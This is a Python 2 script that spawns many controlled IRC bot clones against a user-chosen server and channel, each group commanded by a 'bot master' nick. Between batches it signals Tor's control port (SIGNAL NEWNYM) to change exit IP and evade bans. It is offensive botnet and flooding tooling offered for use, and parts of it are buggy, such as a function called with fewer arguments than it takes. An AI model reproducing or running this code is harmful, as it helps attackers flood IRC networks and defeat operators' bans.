import argparse
import string
import random

from connect import *

def let_the_fun_begin(  irc,port,s,master,channel,nicklist ):

        for i in xrange( 10 ):
                nick = ''
                if nicklist is not None:
                    nick = random.choice( [ x for x in open( "pokemon.txt", "r" ).readlines() ] ).rstrip( "\n" )
                else:
                    for _ in range(random.randint(4,9)): 
                        nick += ''.join(random.choice(string.ascii_lowercase) )

                Thread( Con, (irc,port,s,master,channel,nick,))

        while True:
                continue

def new_ip():
	sock = socket.socket()
	sock.connect(("127.0.0.1",9051))
	sock.send( "AUTHENTICATE\r\n" )
	sock.send( "SIGNAL NEWNYM\r\n" )
	sock.close()

if __name__ == "__main__":
	parser = argparse.ArgumentParser( sys.argv[0].split('/')[0] )

	parser.add_argument( "-i", help="irc server to connect to", required=True )
	parser.add_argument( "-p", help="port to connect to", required=True )
	parser.add_argument( "-s", help="if ssl is required 1 else 0", required=False )
	parser.add_argument( "-b", help="number of bots", required=True )
	parser.add_argument( "-m", help="bot master irc nick", required=True )
	parser.add_argument( "-c", help="irc channel", required=True )

	args 	= vars( parser.parse_args() )

	s 		= int(args["s"])
	irc 	= args["i"]
	bot 	= int(args["b"])
	port 	= int(args["p"])
	master 	= args["m"]
	channel = args["c"]

	for i in range( bot ):
		Process( target=let_the_fun_begin, args=(irc, port, s, master, channel,) ).start()
		time.sleep(2)
		new_ip()
	print "[+] All bots are connected"
	while True:
		time.sleep(10)

